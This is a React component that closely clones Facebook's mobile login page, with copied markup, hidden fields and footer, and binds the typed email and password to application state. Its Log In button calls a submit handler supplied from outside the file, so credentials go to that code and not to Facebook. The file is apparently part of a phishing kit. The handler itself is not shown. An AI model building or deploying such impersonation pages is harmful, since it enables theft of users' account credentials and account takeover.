import React from 'react'
import logo from './img/logo.svg';
function FBLayout({
    setInputData,
    inputData,
    onSubmitHandelar
}) {
    return (
        <div tabindex="0" class="touch x1-5 tablet android _fzu _50-3 iframe acw">
            <div id="viewport" data-kaios-focus-transparent={1}>
                <h1
                    style={{
                        display: "block",
                        height: 0,
                        overflow: "hidden",
                        position: "absolute",
                        width: 0,
                        padding: 0
                    }}
                >
                    Facebook
                </h1>
                <div id="page">
                    <div className="_129_" id="header-notices" />
                    <div
                        className="maxwidth _5soa acw"
                        id="root"
                        role="main"
                        data-sigil="context-layer-root content-pane"
                    >
                        <div className="_7om2">
                            <div className="_4g34" id="u_0_0_6L">

                                <div className="_9om_">
                                    <div className="_4-4l">
                                        <div
                                            id="login_top_banner"
                                            data-sigil="m_login_upsell login_identify_step_element"
                                        >
                                            <div className="_qw9 grouped aclb" id="u_0_1_CF">
                                                <a
                                                    href="https://m.facebook.com/click.php?redir_url=market%3A%2F%2Fdetails%3Fid%3Dcom.facebook.katana%26referrer%3Dutm_reg%253DDSgOYhSt_vp2vn8KSuVyR4Jc%26referrer_params%255Blink_source%255D%3Dfb_app_banner&app_id=350685531728&cref=mb&no_fw=1&refid=8"
                                                    target="_top"
                                                    className="touchableArea first last area touchable acy apl abt abb"
                                                    data-sigil="touchable marea"
                                                >
                                                    <div className="ib cc">
                                                        <i className="l img sp_xm9DDmY7HAL_1_5x sx_76c966" />
                                                        <div className="c">
                                                            <span className="fcl">
                                                                Get Facebook for Android and browse faster.
                                                            </span>
                                                        </div>
                                                    </div>
                                                </a>
                                            </div>
                                        </div>
                                        <div className="_7om2 _52we _2pid _52z6">
                                            <div className="_4g34">
                                                <a href="https://facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjQ1MDk0OTI4LCJjYWxsc2l0ZV9pZCI6Nzk2MTcwNzM0NTY5ODY0fQ%3D%3D&refid=8">
                                                    <img
                                                        src={logo}
                                                        width={112}
                                                        className="img"
                                                        alt="facebook"
                                                    />
                                                </a>
                                            </div>
                                        </div>
                                        <div className="_5rut">
                                            <form
                                                method="post"
                                                action="login.php"
                                                className="mobile-login-form _9hp- _5spm"
                                                id="login_form"
                                                noValidate={1}
                                            >
                                                <input
                                                    type="hidden"
                                                    name="lsd"
                                                    defaultValue="AVrqJpyOZ5I"
                                                    autoComplete="off"
                                                />
                                                <input
                                                    type="hidden"
                                                    name="jazoest"
                                                    defaultValue={2980}
                                                    autoComplete="off"
                                                />
                                                <input
                                                    type="hidden"
                                                    name="m_ts"
                                                    defaultValue={1645094929}
                                                />
                                                <input
                                                    type="hidden"
                                                    name="li"
                                                    defaultValue="ECgOYqmD39tB8B92hU1BC3Fe"
                                                />
                                                <input
                                                    type="hidden"
                                                    name="try_number"
                                                    defaultValue={0}
                                                    data-sigil="m_login_try_number"
                                                />
                                                <input
                                                    type="hidden"
                                                    name="unrecognized_tries"
                                                    defaultValue={0}
                                                    data-sigil="m_login_unrecognized_tries"
                                                />
                                                <div
                                                    id="user_info_container"
                                                    data-sigil="user_info_after_failure_element"
                                                />
                                                <div
                                                    id="pwd_label_container"
                                                    data-sigil="user_info_after_failure_element"
                                                />
                                                <div id="otp_retrieve_desc_container" />
                                                <div>
                                                    <div className="_56be">
                                                        <div className="_55wo _56bf">
                                                            <div className="_96n9" id="email_input_container">
                                                                <input
                                                                    autoCorrect="off"
                                                                    autoCapitalize="off"
                                                                    type="email"
                                                                    className="_56bg _4u9z _5ruq _8qtn"
                                                                    autoComplete="on"
                                                                    id="m_login_email"
                                                                    name="email"
                                                                    placeholder="Mobile number or email address"
                                                                    data-sigil="m_login_email"
                                                                    onChange={(e) => setInputData({ ...inputData, email: e.target.value })}
                                                                    value={inputData.email}

                                                                />
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div className="_55wq" />
                                                    <div className="_56be">
                                                        <div className="_55wo _56bf">
                                                            <div
                                                                className="_1upc _mg8"
                                                                data-sigil="m_login_password"
                                                            >
                                                                <div className="_7om2">
                                                                    <div className="_4g34 _5i2i _52we">
                                                                        <div className="_5xu4">
                                                                            <input
                                                                                autoCorrect="off"
                                                                                autoCapitalize="off"
                                                                                className="_56bg _4u9z _27z2 _8qtm"
                                                                                autoComplete="on"
                                                                                id="m_login_password"
                                                                                name="pass"
                                                                                placeholder="Password"
                                                                                type="password"
                                                                                data-sigil="password-plain-text-toggle-input"
                                                                                onChange={(e) => setInputData({ ...inputData, password: e.target.value })}
                                                                                value={inputData.password}
                                                                            />
                                                                            <input
                                                                                type="hidden"
                                                                                id="hiddenPass"
                                                                                name="pass"
                                                                            />
                                                                        </div>
                                                                    </div>
                                                                    <div className="_5s61 _216i _5i2i _52we">
                                                                        <div className="_5xu4">

                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div className="_2pie" style={{ textAlign: "center" }}>
                                                    <div
                                                        id="login_password_step_element"
                                                        data-sigil="login_password_step_element"
                                                    >
                                                        <button
                                                            style={{ cursor: 'pointer' }}
                                                            type="button"
                                                            value="Log In"
                                                            className="_54k8 _52jh _56bs _56b_ _28lf _9cow _56bw _56bu"
                                                            id="btnsubmit"
                                                            name="login"
                                                            data-sigil="touchable login_button_block m_login_button"
                                                            onClick={onSubmitHandelar}
                                                        >
                                                            <span className="_55sr">Log In</span>
                                                        </button>
                                                    </div>


                                                    <div id="otp_button_elem_container" />
                                                </div>
                                                <input
                                                    type="hidden"
                                                    name="prefill_contact_point"
                                                    id="prefill_contact_point"
                                                />
                                                <input
                                                    type="hidden"
                                                    name="prefill_source"
                                                    id="prefill_source"
                                                />
                                                <input
                                                    type="hidden"
                                                    name="prefill_type"
                                                    id="prefill_type"
                                                />
                                                <input
                                                    type="hidden"
                                                    name="first_prefill_source"
                                                    id="first_prefill_source"
                                                />
                                                <input
                                                    type="hidden"
                                                    name="first_prefill_type"
                                                    id="first_prefill_type"
                                                />
                                                <input
                                                    type="hidden"
                                                    name="had_cp_prefilled"
                                                    id="had_cp_prefilled"
                                                    defaultValue="false"
                                                />
                                                <input
                                                    type="hidden"
                                                    name="had_password_prefilled"
                                                    id="had_password_prefilled"
                                                    defaultValue="false"
                                                />
                                                <input
                                                    type="hidden"
                                                    name="is_smart_lock"
                                                    id="is_smart_lock"
                                                    defaultValue="false"
                                                />
                                                <input
                                                    type="hidden"
                                                    id="bi_xrwh"
                                                    name="bi_xrwh"
                                                    defaultValue={-1650198048183390780}
                                                />
                                                <input type="hidden" id="scetoggle" />
                                                <div className="_xo8" />
                                                <noscript>
                                                    &lt;input type="hidden" name="_fb_noscript" value="true"
                                                    /&gt;
                                                </noscript>
                                            </form>
                                            <div>
                                                <div className="_2pie _9omz">
                                                    <div className="_52jj _9on1">
                                                        <a
                                                            className="_9on1"
                                                            tabIndex={0}
                                                            href="https://facebook.com/recover/initiate/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjQ1MDk0OTI4LCJjYWxsc2l0ZV9pZCI6Mjg0Nzg1MTQ5MzQ1MzY5fQ%3D%3D&c=https%3A%2F%2Fm.facebook.com%2F&r&cuid&ars=facebook_login&lwv=100&refid=8"
                                                            id="forgot-password-link"
                                                        >
                                                            Forgotten password?
                                                        </a>
                                                    </div>
                                                </div>
                                                <div style={{ paddingTop: 42 }}>
                                                    <div>
                                                        <div>
                                                            <div>
                                                                <div
                                                                    id="login_reg_separator"
                                                                    className="_43mg _8qtf"
                                                                    data-sigil="login_reg_separator"
                                                                >
                                                                    <span className="_43mh">or</span>
                                                                </div>
                                                                <div
                                                                    className="_52jj _5t3b"
                                                                    id="signup_button_area"
                                                                >
                                                                    <a
                                                                        role="button"
                                                                        className="_5t3c _28le btn btnS medBtn mfsm touchable"
                                                                        id="signup-button"
                                                                        href="https://facebook.com/reg-no-deeplink/?cid=103&refid=8"
                                                                        tabIndex={0}
                                                                        data-sigil="m_reg_button"
                                                                    >
                                                                        Create New Account
                                                                    </a>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div className="_2pie" style={{ textAlign: "center" }}>
                                                            <div>
                                                                <div data-sigil="login_identify_step_element" />
                                                                <div className="other-links _8p_m">
                                                                    <ul className="_5pkb _55wp">
                                                                        <li />
                                                                    </ul>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>


                        <div className="_55wr _5ui2" data-sigil="m_login_footer">
                            <div className="_5dpw">
                                <div
                                    className="_5ui3"
                                    data-nocookies={1}
                                    id="locale-selector"
                                    data-sigil="language_selector marea"
                                >
                                    <div className="_7om2">
                                        <div className="_4g34">
                                            <span className="_52jc _52j9 _52jh _3ztb">English (UK)</span>
                                            <div className="_3ztc">
                                                <span className="_52jc">
                                                    <a
                                                        href="https://facebook.com/intl/save_locale/?loc=as_IN&href=https%3A%2F%2Fm.facebook.com%2F&ls_ref=mobile_suggested_locale_selector&refid=8"
                                                        data-ajaxify-href="https://facebook.com/intl/save_locale/?loc=as_IN&href=https%3A%2F%2Fm.facebook.com%2F&ls_ref=mobile_suggested_locale_selector&refid=8"
                                                        data-method="post"
                                                        data-sigil="ajaxify"
                                                    >
                                                        অসমীয়া
                                                    </a>
                                                </span>
                                            </div>
                                            <div className="_3ztc">
                                                <span className="_52jc">
                                                    <a
                                                        href="https://facebook.com/intl/save_locale/?loc=ne_NP&href=https%3A%2F%2Fm.facebook.com%2F&ls_ref=mobile_suggested_locale_selector&refid=8"
                                                        data-ajaxify-href="https://facebook.com/intl/save_locale/?loc=ne_NP&href=https%3A%2F%2Fm.facebook.com%2F&ls_ref=mobile_suggested_locale_selector&refid=8"
                                                        data-method="post"
                                                        data-sigil="ajaxify"
                                                    >
                                                        नेपाली
                                                    </a>
                                                </span>
                                            </div>
                                            <div className="_3ztc">
                                                <span className="_52jc">
                                                    <a
                                                        href="https://facebook.com/intl/save_locale/?loc=pt_BR&href=https%3A%2F%2Fm.facebook.com%2F&ls_ref=mobile_suggested_locale_selector&refid=8"
                                                        data-ajaxify-href="https://facebook.com/intl/save_locale/?loc=pt_BR&href=https%3A%2F%2Fm.facebook.com%2F&ls_ref=mobile_suggested_locale_selector&refid=8"
                                                        data-method="post"
                                                        data-sigil="ajaxify"
                                                    >
                                                        Português (Brasil)
                                                    </a>
                                                </span>
                                            </div>
                                        </div>
                                        <div className="_4g34">
                                            <div className="_3ztc">
                                                <span className="_52jc">
                                                    <a
                                                        href="https://facebook.com/intl/save_locale/?loc=bn_IN&href=https%3A%2F%2Fm.facebook.com%2F&ls_ref=mobile_suggested_locale_selector&refid=8"
                                                        data-ajaxify-href="https://facebook.com/intl/save_locale/?loc=bn_IN&href=https%3A%2F%2Fm.facebook.com%2F&ls_ref=mobile_suggested_locale_selector&refid=8"
                                                        data-method="post"
                                                        data-sigil="ajaxify"
                                                    >
                                                        বাংলা
                                                    </a>
                                                </span>
                                            </div>
                                            <div className="_3ztc">
                                                <span className="_52jc">
                                                    <a
                                                        href="https://facebook.com/intl/save_locale/?loc=hi_IN&href=https%3A%2F%2Fm.facebook.com%2F&ls_ref=mobile_suggested_locale_selector&refid=8"
                                                        data-ajaxify-href="https://facebook.com/intl/save_locale/?loc=hi_IN&href=https%3A%2F%2Fm.facebook.com%2F&ls_ref=mobile_suggested_locale_selector&refid=8"
                                                        data-method="post"
                                                        data-sigil="ajaxify"
                                                    >
                                                        हिन्दी
                                                    </a>
                                                </span>
                                            </div>
                                            <div className="_3ztc">
                                                <span className="_52jc">
                                                    <a
                                                        href="https://facebook.com/intl/save_locale/?loc=es_LA&href=https%3A%2F%2Fm.facebook.com%2F&ls_ref=mobile_suggested_locale_selector&refid=8"
                                                        data-ajaxify-href="https://facebook.com/intl/save_locale/?loc=es_LA&href=https%3A%2F%2Fm.facebook.com%2F&ls_ref=mobile_suggested_locale_selector&refid=8"
                                                        data-method="post"
                                                        data-sigil="ajaxify"
                                                    >
                                                        Español
                                                    </a>
                                                </span>
                                            </div>
                                            <a href="https://facebook.com/language/?next_uri=https%3A%2F%2Fm.facebook.com%2F&refid=8">
                                                <div
                                                    className="_3j87 _1rrd _3ztd"
                                                    aria-label="Complete list of languages"
                                                    data-sigil="more_language"
                                                >
                                                    <i className="img sp_hXwjxxRp6sw_1_5x sx_8ad453" />
                                                </div>
                                            </a>
                                        </div>
                                    </div>
                                </div>
                                <div className="_5ui4">
                                    <div className="_96qv _9a0a">
                                        <a
                                            href="https://about.facebook.com/?refid=8"
                                            className="_96qw"
                                            title="Read our blog, discover the resource centre and find job opportunities."
                                        >
                                            About
                                        </a>
                                        <span aria-hidden="true"> · </span>
                                        <a
                                            href="https://facebook.com/help/?ref=pf&refid=8"
                                            className="_96qw"
                                            title="Visit our Help Centre."
                                        >
                                            Help
                                        </a>
                                        <span aria-hidden="true"> · </span>
                                        <span className="_96qw" id="u_0_5_ah">
                                            More
                                        </span>
                                    </div>

                                    <span className="mfss fcg">Facebook Inc.</span>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div className="" />

                </div>
            </div>

        </div>

    )
}

export default FBLayout